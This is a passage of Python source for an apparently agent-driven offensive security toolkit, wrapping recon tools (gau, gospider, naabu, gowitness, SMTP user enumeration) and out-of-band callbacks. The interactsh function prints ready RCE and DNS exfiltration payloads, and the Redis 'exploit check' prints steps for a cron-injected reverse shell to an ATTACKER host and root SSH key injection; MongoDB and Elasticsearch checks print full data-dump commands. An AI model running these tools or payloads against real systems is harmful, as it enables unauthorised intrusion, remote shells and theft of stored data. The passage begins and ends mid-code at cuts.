        urls = [u for u in output.splitlines() if u.strip()]
        total = len(urls)
        # Group by extension
        interesting_exts = {'.php', '.asp', '.aspx', '.jsp', '.json', '.xml',
                             '.js', '.config', '.bak', '.sql', '.env', '.log', '.txt'}
        by_type: dict[str, list[str]] = {}
        for u in urls:
            path = _up(u).path.lower()
            ext = path.rsplit('.', 1)[-1] if '.' in path else 'other'
            ext = f".{ext}" if not ext.startswith('.') else ext
            by_type.setdefault(ext, []).append(u)

        lines = [f"## GAU Results: {target_domain}", f"Total URLs found: {total}", ""]
        for ext in sorted(by_type.keys()):
            grp = by_type[ext]
            flag = " ⚠️" if ext in interesting_exts else ""
            lines.append(f"### {ext}{flag} ({len(grp)} URLs)")
            for u in grp[:20]:
                lines.append(f"  {u}")
            if len(grp) > 20:
                lines.append(f"  ... and {len(grp) - 20} more")
        return "\n".join(lines)
    except FileNotFoundError:
        return ("Error: gau not found.\n"
                "Install: go install github.com/lc/gau/v2/cmd/gau@latest")
    except subprocess.TimeoutExpired as e:
        partial_out = e.stdout or ""
        if isinstance(partial_out, bytes):
            partial_out = partial_out.decode(errors="replace")
        elif isinstance(partial_out, bytearray):
            partial_out = bytes(partial_out).decode(errors="replace")
        elif isinstance(partial_out, memoryview):
            partial_out = partial_out.tobytes().decode(errors="replace")
        elif not isinstance(partial_out, str):
            partial_out = str(partial_out)
        partial_out = partial_out.strip()

        if partial_out:
            urls = [u for u in partial_out.splitlines() if u.strip()]
            sample_count = min(50, len(urls))
            sample = "\n".join(urls[:sample_count])
            return (
                f"Error: gau timed out after {timeout_seconds} seconds, but produced {len(urls)} URLs before timing out.\n"
                f"Sample URLs ({sample_count}):\n{sample}"
            )

        return f"Error: gau timed out after {timeout_seconds} seconds"
    except Exception as e:
        return f"Error running gau: {e}"


@function_tool()
def gospider_crawl(url: str, depth: int = 3, threads: int = 20, options: str = "") -> str:
    """
    Fast web spider for crawling a target and harvesting URLs, forms, JS endpoints,
    and subdomains using gospider.

    Args:
        url: Target URL (e.g. http://example.com)
        depth: Crawl depth (default 3)
        threads: Concurrent threads (default 20)
        options: Extra gospider flags (e.g. "--js --sitemap --robots")

    Returns:
        Crawled URLs grouped by type, plus JS endpoints and forms
    """
    import shlex as _shlex
    try:
        if not options:
            options = "--js --sitemap --robots"
        cmd = ["gospider", "-s", url, "-d", str(depth), "-t", str(threads),
               "-c", "10", "--no-redirect"]
        if options:
            cmd += _shlex.split(options)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = (result.stdout or "").strip()
        if not output:
            err = (result.stderr or "").strip()
            return f"gospider returned no output for {url}.\nstderr: {err or '(none)'}"

        lines_raw = output.splitlines()
        urls, js_urls, forms, subdomains = [], [], [], []
        for line in lines_raw:
            if '[url]' in line.lower():
                u = line.split(']', 1)[-1].strip().split(' ')[0]
                if u.startswith('http'):
                    urls.append(u)
            elif '[javascript]' in line.lower() or '.js' in line.lower():
                js_urls.append(line.strip())
            elif '[form]' in line.lower():
                forms.append(line.strip())
            elif '[subdomain]' in line.lower():
                subdomains.append(line.strip())

        out = [f"## GoSpider Results: {url}",
               f"Crawled URLs: {len(urls)} | JS files: {len(js_urls)} | "
               f"Forms: {len(forms)} | Subdomains: {len(subdomains)}", ""]
        if urls:
            out.append("### Discovered URLs")
            for u in urls[:60]:
                out.append(f"  {u}")
            if len(urls) > 60:
                out.append(f"  ... and {len(urls) - 60} more")
        if js_urls:
            out.append("\n### JavaScript Files")
            for j in js_urls[:20]:
                out.append(f"  {j}")

        # ── Download JS files to session directory ───────────────────────────
        if js_urls:
            try:
                from src.repl.target_manager import get_target_manager as _gtm
                import urllib.parse as _up
                _js_dir = _gtm().get_js_dir()
                if _js_dir:
                    _downloaded = []
                    for _jl in js_urls:
                        _jm = re.search(r'https?://\S+\.js\b[^\s"\']*', _jl)
                        if not _jm:
                            continue
                        _js_url = _jm.group(0)
                        _raw_name = _up.urlparse(_js_url).path.rsplit('/', 1)[-1].split('?')[0]
                        _fname = re.sub(r'[^\w.\-]', '_', _raw_name)[:100] or "file.js"
                        _fpath = _js_dir / _fname
                        if _fpath.exists():
                            _downloaded.append(f"  {_fpath} (cached)")
                            continue
                        try:
                            import requests as _req
                            _r = _req.get(_js_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
                            if _r.status_code == 200:
                                _fpath.write_bytes(_r.content)
                                _downloaded.append(f"  {_fpath}")
                        except Exception:
                            pass
                    if _downloaded:
                        out.append(f"\n### JS Files Downloaded → {_js_dir}")
                        out.extend(_downloaded[:15])
                        out.append(
                            f"\n💡 Run secretfinder_js('{_js_dir}') or "
                            f"linkfinder_js('{_js_dir}') to scan for secrets/endpoints"
                        )
            except Exception:
                pass
        if forms:
            out.append("\n### Forms Found")
            for f in forms[:20]:
                out.append(f"  {f}")
        if subdomains:
            out.append("\n### Subdomains Found")
            for s in subdomains[:20]:
                out.append(f"  {s}")
        if not urls and not js_urls:
            out.append("Raw output:")
            out.extend(lines_raw[:50])
        return "\n".join(out)
    except FileNotFoundError:
        return ("Error: gospider not found.\n"
                "Install: go install github.com/jaeles-project/gospider@latest")
    except subprocess.TimeoutExpired:
        return "Error: gospider timed out after 5 minutes"
    except Exception as e:
        return f"Error running gospider: {e}"


@function_tool()
async def url_corpus_build(
    target: str,
    include_subs: bool = True,
    use_gau: bool = True,
    use_wayback: bool = True,
    use_paramspider: bool = True,
    use_katana: bool = True,
    use_gospider: bool = False,
    max_urls: int = 5000,
) -> str:
    """
    Build a consolidated URL corpus from passive + active sources.

    Args:
        target: Domain or URL
        include_subs: Include subdomains for passive sources
        use_gau: Use GAU archive harvest
        use_wayback: Use Wayback URLs
        use_paramspider: Use ParamSpider for parameterized URLs
        use_katana: Use Katana crawl (active)
        use_gospider: Use GoSpider crawl (active)
        max_urls: Cap total URLs stored (default 5000)

    Returns:
        Summary with counts and saved file paths (if session active)
    """
    def _as_url(t: str) -> str:
        return t if "//" in t else f"https://{t}"

    def _extract_urls(text: str) -> list[str]:
        return re.findall(r"https?://[^\s'\"<>]+", text or "")

    urls: list[str] = []
    base = target.strip()
    base_url = _as_url(base)

    if use_gau:
        try:
            urls += _extract_urls(await gau_harvest.invoke(url=base, include_subs=include_subs))
        except Exception:
            pass
    if use_wayback:
        try:
            from src.tools.recon_passive import waybackurls as _wayback
            urls += _extract_urls(await _wayback.invoke(domain=base, no_subs=not include_subs))
        except Exception:
            pass
    if use_paramspider:
        try:
            from src.tools.recon_passive import paramspider as _paramspider
            urls += _extract_urls(await _paramspider.invoke(domain=base, exclude="css,jpg,jpeg,png,svg,woff,woff2,ttf,eot,ico"))
        except Exception:
            pass
    if use_katana:
        try:
            urls += _extract_urls(await katana_crawl.invoke(target=base_url))
        except Exception:
            pass
    if use_gospider:
        try:
            urls += _extract_urls(await gospider_crawl.invoke(url=base_url))
        except Exception:
            pass

    # Deduplicate and cap
    urls = list(dict.fromkeys(u.strip() for u in urls if u.strip()))
    if max_urls and len(urls) > max_urls:
        urls = urls[:max_urls]

    param_urls = [u for u in urls if "?" in u and "=" in u]
    api_urls = [u for u in urls if any(k in u.lower() for k in ["/api/", "/v1/", "/v2/"])]
    auth_urls = [u for u in urls if any(k in u.lower() for k in ["login", "signin", "auth", "oauth", "token"]) ]
    upload_urls = [u for u in urls if any(k in u.lower() for k in ["upload", "file", "attachment"]) ]
    admin_urls = [u for u in urls if any(k in u.lower() for k in ["admin", "dashboard", "manage"]) ]

    saved_paths = []
    try:
        from src.repl.target_manager import get_target_manager
        tm = get_target_manager()
        out_dir = tm.get_session_files_dir()
        if out_dir:
            (out_dir / "url_corpus.txt").write_text("\n".join(urls), encoding="utf-8")
            (out_dir / "param_urls.txt").write_text("\n".join(param_urls), encoding="utf-8")
            (out_dir / "api_urls.txt").write_text("\n".join(api_urls), encoding="utf-8")
            saved_paths = [
                str(out_dir / "url_corpus.txt"),
                str(out_dir / "param_urls.txt"),
                str(out_dir / "api_urls.txt"),
            ]
    except Exception:
        pass

    out = [
        f"## URL Corpus Build: {base}",
        f"Total URLs: {len(urls)} (params: {len(param_urls)}, api: {len(api_urls)})",
        f"Auth-related: {len(auth_urls)} | Upload-related: {len(upload_urls)} | Admin-related: {len(admin_urls)}",
        "",
    ]
    if saved_paths:
        out.append("Saved:")
        out.extend(f"  {p}" for p in saved_paths)
        out.append("")

    if param_urls:
        out.append("### Sample Parameterized URLs")
        out.extend(param_urls[:20])
    else:
        out.append("No parameterized URLs found.")

    out.append("")
    out.append("Next: run arjun_params on the most promising parameterized endpoints.")
    return "\n".join(out)


@function_tool()
def httpx_tech_detect(target: str, follow_redirects: bool = True) -> str:
    """
    Identify technologies using httpx with tech detection.

    Args:
        target: Target URL or domain
        follow_redirects: Follow HTTP redirects

    Returns:
        Detected technologies, status codes, and titles
    """
    try:
        cmd = ["httpx", "-u", target, "-tech-detect", "-status-code", "-title", "-server"]
        if follow_redirects:
            cmd.append("-follow-redirects")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout.strip() or result.stderr.strip()
        if not output:
            return f"No results for {target}"
        return f"## httpx Tech Detection: {target}\n\n{output}"
    except FileNotFoundError:
        return "Error: httpx not found. Install: go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    except subprocess.TimeoutExpired:
        return "Error: httpx timed out after 60 seconds"
    except Exception as e:
        return f"Error: {e}"


@function_tool()
def wappalyzer_scan(url: str) -> str:
    """
    Detect web technologies using Wappalyzer.

    Args:
        url: Target URL

    Returns:
        Detected technologies with versions and categories
    """
    try:
        from Wappalyzer import Wappalyzer, WebPage  # type: ignore
        wappalyzer = Wappalyzer.latest()
        webpage = WebPage.new_from_url(url)
        result = wappalyzer.analyze_with_versions_and_categories(webpage)
        if not result:
            return f"No technologies detected for {url}"
        return f"Technologies detected on {url}:\n{json.dumps(result, indent=2)}"
    except ImportError:
        return "Error: Wappalyzer not installed. Install: pip install python-Wappalyzer"
    except Exception as e:
        return f"Error running Wappalyzer: {e}"


@function_tool()
def cors_check(url: str) -> str:
    """
    Check for CORS misconfigurations.

    Args:
        url: Target URL

    Returns:
        CORS analysis results
    """
    try:
        origins_to_test = [
            "null",
            "https://evil.com",
            "http://evil.com",
            f"https://sub.{re.sub(r'https?://', '', url).split('/')[0]}",
        ]
        lines = [f"## CORS Check: {url}\n"]
        vulnerable = []
        for origin in origins_to_test:
            try:
                resp = requests.get(url, headers={"Origin": origin}, timeout=10)
                acao = resp.headers.get("Access-Control-Allow-Origin", "(not set)")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "(not set)")
                is_vuln = (acao == origin or acao == "*") and acac.lower() == "true"
                status = "VULNERABLE" if is_vuln else "OK"
                lines.append(f"  [{status}] Origin: {origin}")
                lines.append(f"         ACAO: {acao} | ACAC: {acac}")
                if is_vuln:
                    vulnerable.append(origin)
            except Exception as req_e:
                lines.append(f"  [ERROR] Origin: {origin} -> {req_e}")

        if vulnerable:
            lines.append(f"\n⚠ CORS misconfiguration detected! Vulnerable origins: {', '.join(vulnerable)}")
        else:
            lines.append("\n✓ No obvious CORS misconfigurations found.")
        return "\n".join(lines)
    except Exception as e:
        return f"Error checking CORS: {e}"


@function_tool()
def security_headers_check(url: str) -> str:
    """
    Check for missing or misconfigured security headers.

    Args:
        url: Target URL

    Returns:
        Security header analysis
    """
    SECURITY_HEADERS = [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Referrer-Policy",
        "Permissions-Policy",
        "X-XSS-Protection",
    ]
    try:
        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        present = []
        missing = []
        for header in SECURITY_HEADERS:
            value = resp.headers.get(header)
            if value:
                present.append(f"  ✓ {header}: {value}")
            else:
                missing.append(f"  ✗ {header}")
        if not missing:
            return f"Security Headers Analysis for {url}\nAll security headers present! ✓"
        lines = [f"Security Headers Analysis for {url}"]
        if present:
            lines.append("Present Headers:")
            lines.extend(present)
        if missing:
            lines.append("Missing Headers:")
            lines.extend(missing)
        return "\n".join(lines)
    except Exception as e:
        return f"Error checking security headers: {e}"


# ---------------------------------------------------------------------------
# SMTP User Enumeration
# ---------------------------------------------------------------------------

@function_tool()
def smtp_user_enum(
    target: str,
    userlist: str,
    port: int = 25,
    method: str = "VRFY",
    options: str = "",
) -> str:
    """
    Enumerate valid SMTP users via VRFY, EXPN, or RCPT TO.
    Critical for mail servers (Exim, Postfix, Sendmail) — reveals valid usernames
    for brute-force or phishing, and confirms whether VRFY/EXPN are enabled.

    Args:
        target: SMTP server IP or hostname
        userlist: Path to wordlist file (e.g. /usr/share/wordlists/metasploit/unix_users.txt)
                  OR comma-separated list of usernames (e.g. "admin,root,postmaster")
        port: SMTP port (default 25; also try 587, 465)
        method: Enumeration method — VRFY (most common), EXPN, or RCPT
        options: Extra smtp-user-enum flags

    Returns:
        List of valid users found on the mail server
    """
    import tempfile
    tmp = None
    try:
        # If comma-separated names given, write to temp file
        if not os.path.isfile(userlist):
            tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            for u in userlist.split(","):
                tmp.write(u.strip() + "\n")
            tmp.close()
            ulist_path = tmp.name
        else:
            ulist_path = userlist

        cmd = [
            "smtp-user-enum",
            "-M", method.upper(),
            "-U", ulist_path,
            "-t", target,
            "-p", str(port),
        ] + (options.split() if options else [])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout.strip() or result.stderr.strip()

        if not output:
            return f"No response from smtp-user-enum against {target}:{port}"
        return f"## SMTP User Enumeration ({method}) — {target}:{port}\n\n{output}"

    except FileNotFoundError:
        return (
            "Error: smtp-user-enum not found.\n"
            "Install: sudo apt install smtp-user-enum\n"
            "Or via cpan: sudo cpan Net::SMTP"
        )
    except subprocess.TimeoutExpired:
        return f"Error: smtp-user-enum timed out after 5 minutes against {target}"
    except Exception as e:
        return f"Error: {e}"
    finally:
        if tmp and os.path.exists(tmp.name):
            try:
                os.remove(tmp.name)
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Naabu — Fast Port Scanner (ProjectDiscovery)
# ---------------------------------------------------------------------------

@function_tool()
def naabu_port_scan(
    target: str,
    ports: str = "top-100",
    options: str = "-c 250 -timeout 5000",
) -> str:
    """
    Fast port scanner by ProjectDiscovery (naabu). Complement to nmap —
    scans thousands of ports per second using SYN packets,
    ideal for quickly confirming open ports on a large CIDR or host list
    before handing off to nmap_service_scan for deep -sV fingerprinting.

    Args:
        target: Target IP, CIDR (192.168.1.0/24), or file path with targets
        ports: Port specification — 'top-100', 'top-1000', '1-65535',
               or specific ports '22,80,443,8080'
        options: Extra naabu flags (e.g. '-c 500 -rate 10000 -exclude-cdn')

    Returns:
        Open ports with host:port format, ready for nmap_service_scan
    """
    try:
        if target.endswith(".txt") and os.path.isfile(target):
            input_flags = ["-list", target]
        elif "/" in target and not target.startswith("http"):
            input_flags = ["-host", target]
        else:
            input_flags = ["-host", target]

        port_flags = []
        if ports in ("top-100", "top-1000"):
            port_flags = ["-top-ports", ports.split("-")[1]]
        elif ports == "1-65535":
            port_flags = ["-p", "-"]
        else:
            port_flags = ["-p", ports]

        cmd = ["naabu"] + input_flags + port_flags + options.split()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout.strip() or result.stderr.strip()

        if not output:
            return f"No open ports found by naabu on {target}"
        return f"## Naabu Port Scan — {target}\n\n{output}\n\nNext step: run nmap_service_scan on these ports for version detection."

    except FileNotFoundError:
        return (
            "Error: naabu not found.\n"
            "Install: go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
        )
    except subprocess.TimeoutExpired:
        return f"Error: naabu timed out after 10 minutes against {target}"
    except Exception as e:
        return f"Error: {e}"


# ---------------------------------------------------------------------------
# Gowitness — Web Screenshot at Scale
# ---------------------------------------------------------------------------

@function_tool()
def gowitness_screenshot(
    target: str,
    output_dir: str = "",
    options: str = "",
) -> str:
    """
    Take screenshots of web services at scale using gowitness.
    Essential for bulk subdomain recon — quickly identifies live web pages,
    login panels, admin interfaces, and interesting content without manually
    visiting hundreds of URLs.

    Args:
        target: Single URL, file path with URLs (one per line), or CIDR
                e.g. 'https://example.com', 'subdomains.txt', '192.168.1.0/24'
        output_dir: Directory to store screenshots (default: ./gowitness-output)
        options: Extra gowitness flags (e.g. '--timeout 10 --threads 20')

    Returns:
        Screenshot results with paths and HTTP status information
    """
    import tempfile
    if not output_dir:
        output_dir = os.path.join(tempfile.gettempdir(), "gowitness-output")
    os.makedirs(output_dir, exist_ok=True)

    try:
        if os.path.isfile(target):
            cmd = ["gowitness", "file", "-f", target, "--destination", output_dir]
        elif "/" in target and not target.startswith("http"):
            cmd = ["gowitness", "nmap", "--nmap-file", target, "--destination", output_dir]
        else:
            cmd = ["gowitness", "single", "-u", target, "--destination", output_dir]

        cmd += options.split()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        output = result.stdout.strip() or result.stderr.strip()

        if "source code cannot contain null bytes" in output or "SyntaxError" in output:
            return (
                "Error: gowitness binary appears corrupted or is being launched with the wrong interpreter.\n"
                f"Command: {' '.join(cmd)}\n"
                f"Output: {output}\n"
                "Reinstall with: go install github.com/sensepost/gowitness@latest\n"
                "Then ensure the Go binary directory is before Python/script wrappers on PATH."
            )

        screenshots = []
        if os.path.isdir(output_dir):
            screenshots = [f for f in os.listdir(output_dir) if f.endswith(".png")]

        summary = f"## Gowitness Screenshots — {target}\n\n"
        if output:
            summary += output + "\n\n"
        summary += f"Screenshots saved to: {output_dir}\n"
        summary += f"Total screenshots taken: {len(screenshots)}"
        return summary

    except FileNotFoundError:
        return (
            "Error: gowitness not found.\n"
            "Install: go install github.com/sensepost/gowitness@latest"
        )
    except subprocess.TimeoutExpired:
        return "Error: gowitness timed out after 10 minutes"
    except Exception as e:
        return f"Error: {e}"


# =============================================================================
# INTERACTSH — Out-of-Band Callback Server
# =============================================================================

# Global interactsh state
_interactsh_process = None
_interactsh_url = None
_interactsh_log_file = None


@function_tool()
def interactsh_start() -> str:
    """
    Start an interactsh-client to generate a unique OOB callback URL.
    Use this URL in SSRF, XXE, RCE, and DNS exfiltration payloads.
    When the target server makes a request to this URL, interactsh captures it.

    After starting, use interactsh_poll() to check for received callbacks.
    When done, call interactsh_stop() to clean up.

    Returns:
        The unique *.interact.sh URL to use in your payloads
    """
    global _interactsh_process, _interactsh_url, _interactsh_log_file

    # Clean up any existing session
    if _interactsh_process is not None:
        try:
            _interactsh_process.terminate()
        except Exception:
            pass

    # Create log file in session dir
    try:
        from src.repl.target_manager import get_target_manager
        tm = get_target_manager()
        if tm.session_dir:
            log_dir = tm.session_dir
        else:
            log_dir = pathlib.Path(os.getcwd())
    except Exception:
        log_dir = pathlib.Path(os.getcwd())

    _interactsh_log_file = str(log_dir / "interactsh_output.jsonl")

    try:
        # Start interactsh-client in background with JSON output
        _interactsh_process = subprocess.Popen(
            ["interactsh-client", "-json", "-o", _interactsh_log_file, "-n", "1"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

        # Wait for the URL to be generated (appears in stderr)
        import time
        time.sleep(3)

        # Read the generated URL from stderr
        # interactsh-client prints the URL to stderr on startup
        if _interactsh_process.stderr:
            # Non-blocking read
            stderr_output = ""
            try:
                _interactsh_process.stderr.fileno()
                for _ in range(10):
                    time.sleep(0.5)
                    try:
                        line = _interactsh_process.stderr.readline()
                        stderr_output += line
                        if ".interact.sh" in line or ".oast." in line:
                            break
                    except Exception:
                        break
            except Exception:
                time.sleep(2)

            # Extract URL from output
            url_match = re.search(r'(\S+\.(?:interact\.sh|oast\.\w+))', stderr_output)
            if url_match:
                _interactsh_url = url_match.group(1)
                return (
                    f"✅ Interactsh OOB server started!\n"
                    f"Callback URL: {_interactsh_url}\n"
                    f"Log file: {_interactsh_log_file}\n\n"
                    f"Use this URL in your payloads:\n"
                    f"  SSRF: http://{_interactsh_url}\n"
                    f"  DNS:  nslookup $(whoami).{_interactsh_url}\n"
                    f"  XXE:  <!ENTITY xxe SYSTEM \"http://{_interactsh_url}/xxe\">\n"
                    f"  RCE:  curl http://{_interactsh_url}/$(id|base64)\n\n"
                    f"Call interactsh_poll() to check for callbacks."
                )

        # Fallback: couldn't parse URL but process is running
        _interactsh_url = "check-interactsh-output"
        return (
            f"⚠️ Interactsh started but URL not captured from output.\n"
            f"Check: {_interactsh_log_file}\n"
            f"Or run `interactsh-client` manually in a terminal."
        )

    except FileNotFoundError:
        _interactsh_process = None
        return (
            "❌ interactsh-client not found.\n"
            "Install: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n"
            "Or: apt install interactsh-client\n\n"
            "Alternative: Use https://app.interactsh.com in browser for manual OOB testing."
        )
    except Exception as e:
        return f"Error starting interactsh: {str(e)}"


@function_tool()
def interactsh_poll() -> str:
    """
    Poll for received OOB callbacks from the running interactsh server.
    Shows DNS lookups, HTTP requests, SMTP connections, etc. from the target.

    Each callback confirms a blind vulnerability:
    - DNS callback = blind SSRF, RCE, or XXE confirmed
    - HTTP callback = blind SSRF confirmed with request details
    - SMTP callback = email-based injection confirmed

    Returns:
        List of received callbacks with details
    """
    global _interactsh_process, _interactsh_url, _interactsh_log_file

    if _interactsh_process is None:
        return "❌ No interactsh session running. Call interactsh_start() first."

    results = [f"[INTERACTSH] Polling callbacks for: {_interactsh_url}"]

    # Check if process is still running
    if _interactsh_process.poll() is not None:
        results.append("⚠️ Interactsh process has exited")

    # Read the JSONL log file
    callbacks = []
    if _interactsh_log_file and os.path.exists(_interactsh_log_file):
        try:
            with open(_interactsh_log_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        callbacks.append(data)
                    except json.JSONDecodeError:
                        continue
        except Exception as e:
            results.append(f"Error reading log: {e}")

    if not callbacks:
        results.append("\n📭 No callbacks received yet.")
        results.append("  Ensure your payload was submitted to the target.")
        results.append(f"  Callback URL: {_interactsh_url}")
        results.append("  Try again in a few seconds — DNS propagation can take time.")
    else:
        results.append(f"\n🔔 {len(callbacks)} callback(s) received!\n")

        for i, cb in enumerate(callbacks, 1):
            proto = cb.get("protocol", "unknown").upper()
            remote = cb.get("remote-address", "unknown")
            timestamp = cb.get("timestamp", "unknown")
            raw_req = cb.get("raw-request", "")[:300]
            subdomain = cb.get("full-id", "")

            results.append(f"  [{i}] {proto} callback")
            results.append(f"      From: {remote}")
            results.append(f"      Time: {timestamp}")
            if subdomain:
                results.append(f"      Subdomain: {subdomain}")
            if raw_req:
                results.append(f"      Request: {raw_req[:200]}")
            results.append("")

        results.append("🔴 BLIND VULNERABILITY CONFIRMED!")
        results.append("  The target server made an outbound connection to your callback URL.")

    return "\n".join(results)


@function_tool()
def interactsh_stop() -> str:
    """
    Stop the running interactsh-client and clean up.
    Call this when you're done testing OOB vulnerabilities.

    Returns:
        Cleanup status
    """
    global _interactsh_process, _interactsh_url, _interactsh_log_file

    if _interactsh_process is None:
        return "No interactsh session to stop."

    try:
        _interactsh_process.terminate()
        _interactsh_process.wait(timeout=5)
    except Exception:
        try:
            _interactsh_process.kill()
        except Exception:
            pass

    url = _interactsh_url
    log = _interactsh_log_file
    _interactsh_process = None
    _interactsh_url = None
    _interactsh_log_file = None

    return (
        f"✅ Interactsh stopped.\n"
        f"  URL was: {url}\n"
        f"  Log saved: {log}"
    )


# =============================================================================
# SERVICE-SPECIFIC EXPLOIT MODULES
# Quick-win exploits for common services found by nmap
# =============================================================================


@function_tool()
def redis_exploit_check(host: str, port: int = 6379) -> str:
    """
    Test Redis for unauthenticated access and common exploits.
    Redis without auth = server info leak, data dump, and potential RCE via:
    - cron job injection
    - SSH key injection
    - Lua script execution
    - Module loading

    Args:
        host: Redis server IP/hostname
        port: Redis port (default 6379)

    Returns:
        Redis security assessment with exploit guidance
    """
    results = [f"[REDIS EXPLOIT] Testing: {host}:{port}"]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        # Test 1: INFO command (unauthenticated)
        sock.send(b"INFO\r\n")
        response = sock.recv(4096).decode('utf-8', errors='replace')

        if "redis_version" in response:
            results.append("\n🔴 UNAUTHENTICATED ACCESS! Redis is open without password!\n")
            # Parse useful info
            version = re.search(r'redis_version:(\S+)', response)
            os_info = re.search(r'os:(\S+)', response)
            db_info = re.findall(r'(db\d+):keys=(\d+)', response)

            if version:
                results.append(f"  Version: {version.group(1)}")
            if os_info:
                results.append(f"  OS: {os_info.group(1)}")
            if db_info:
                results.append("  Databases with data:")
                for db, keys in db_info:
                    results.append(f"    {db}: {keys} keys")

            # Test 2: CONFIG GET
            sock.send(b"CONFIG GET dir\r\n")
            config_resp = sock.recv(2048).decode('utf-8', errors='replace')
            dir_match = re.search(r'\$\d+\r\n(/\S+)', config_resp)
            if dir_match:
                results.append(f"  Working dir: {dir_match.group(1)}")

            results.append("\n  [EXPLOITATION]")
            results.append(f"  1. Dump all keys: redis-cli -h {host} -p {port} KEYS '*'")
            results.append(f"  2. Dump data: redis-cli -h {host} -p {port} GET <key>")
            results.append("  3. RCE via cron:")
            results.append(f"     redis-cli -h {host} -p {port}")
            results.append('     CONFIG SET dir /var/spool/cron/')
            results.append('     CONFIG SET dbfilename root')
            results.append('     SET x "\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n"')
            results.append('     SAVE')
            results.append("  4. SSH key injection:")
            results.append('     CONFIG SET dir /root/.ssh/')
            results.append('     CONFIG SET dbfilename authorized_keys')
            results.append('     SET x "\\n\\nssh-rsa YOUR_KEY\\n\\n"')
            results.append('     SAVE')

        elif "-NOAUTH" in response or "Authentication required" in response:
            results.append("  🟡 Redis requires authentication (password protected)")
            results.append(f"  Try common passwords: redis-cli -h {host} -p {port} -a <password>")
            results.append("  Common: '', 'redis', 'password', 'admin', 'root', 'foobared'")
        else:
            results.append(f"  Response: {response[:200]}")

        sock.close()

    except socket.timeout:
        results.append("  ⚠️ Connection timed out — port may be filtered")
    except ConnectionRefusedError:
        results.append("  ❌ Connection refused — Redis not running on this port")
    except Exception as e:
        results.append(f"  Error: {str(e)[:60]}")

    return "\n".join(results)


@function_tool()
def mongodb_exploit_check(host: str, port: int = 27017) -> str:
    """
    Test MongoDB for unauthenticated access.
    MongoDB without auth = full database access, data exfiltration.

    Args:
        host: MongoDB server IP/hostname
        port: MongoDB port (default 27017)

    Returns:
        MongoDB security assessment
    """
    results = [f"[MONGODB EXPLOIT] Testing: {host}:{port}"]

    # Try using mongosh/mongo CLI
    for cmd_name in ["mongosh", "mongo"]:
        try:
            result = subprocess.run(
                [cmd_name, "--host", host, "--port", str(port),
                 "--eval", "db.adminCommand({listDatabases:1})",
                 "--quiet"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and "databases" in result.stdout:
                results.append(f"\n🔴 UNAUTHENTICATED ACCESS via {cmd_name}!")
                results.append(f"  Output:\n{result.stdout[:500]}")
                results.append("\n  [EXPLOITATION]")
                results.append(f"  1. List DBs: {cmd_name} --host {host} --eval 'db.adminCommand({{listDatabases:1}})'")
                results.append(f"  2. Use DB: {cmd_name} --host {host} <dbname> --eval 'db.getCollectionNames()'")
                results.append(f"  3. Dump: mongodump --host {host} --port {port}")
                return "\n".join(results)
            elif "Authentication failed" in result.stderr or "auth" in result.stderr.lower():
                results.append("  🟡 MongoDB requires authentication")
                results.append(f"  Try: {cmd_name} --host {host} -u admin -p admin")
                return "\n".join(results)
        except FileNotFoundError:
            continue
        except Exception as e:
            results.append(f"  {cmd_name} error: {str(e)[:50]}")

    # Fallback: raw TCP probe
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        # Send MongoDB wire protocol ismaster
        # Simplified: just check if port accepts connections
        sock.close()
        results.append(f"  Port {port} is open (MongoDB likely running)")
        results.append("  Install mongosh to test: npm install -g mongosh")
    except Exception as e:
        results.append(f"  Connection error: {str(e)[:50]}")

    return "\n".join(results)


@function_tool()
def elasticsearch_exploit_check(host: str, port: int = 9200) -> str:
    """
    Test Elasticsearch for unauthenticated access.
    Open Elasticsearch = full index data exfiltration.

    Args:
        host: Elasticsearch server IP/hostname
        port: Elasticsearch port (default 9200)

    Returns:
        Elasticsearch security assessment
    """
    results = [f"[ELASTICSEARCH EXPLOIT] Testing: {host}:{port}"]

    base_url = f"http://{host}:{port}"

    # Test 1: Root endpoint (version + cluster info)
    try:
        resp = requests.get(base_url, timeout=5, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            results.append("\n🔴 UNAUTHENTICATED ACCESS!")
            results.append(f"  Cluster: {data.get('cluster_name', 'unknown')}")
            results.append(f"  Version: {data.get('version', {}).get('number', 'unknown')}")

            # Test 2: List all indices
            idx_resp = requests.get(f"{base_url}/_cat/indices?v", timeout=5, verify=False)
            if idx_resp.status_code == 200:
                results.append("\n  [INDICES]")
                for line in idx_resp.text.strip().split("\n")[:15]:
                    results.append(f"    {line}")

            # Test 3: Check for sensitive index names
            if idx_resp.status_code == 200:
                sensitive = ["user", "password", "auth", "credential", "secret",
                             "payment", "credit", "ssn", "customer", "employee"]
                found_sensitive = [idx for idx in idx_resp.text.lower().split()
                                   if any(s in idx for s in sensitive)]
                if found_sensitive:
                    results.append(f"\n  🔴 SENSITIVE INDICES: {', '.join(found_sensitive[:5])}")

            results.append("\n  [EXPLOITATION]")
            results.append(f"  1. Dump index: curl {base_url}/<index>/_search?pretty&size=100")
            results.append(f"  2. All docs: curl {base_url}/_search?pretty&size=10000")
            results.append(f"  3. Bulk dump: elasticdump --input={base_url} --output=dump.json")

        elif resp.status_code == 401:
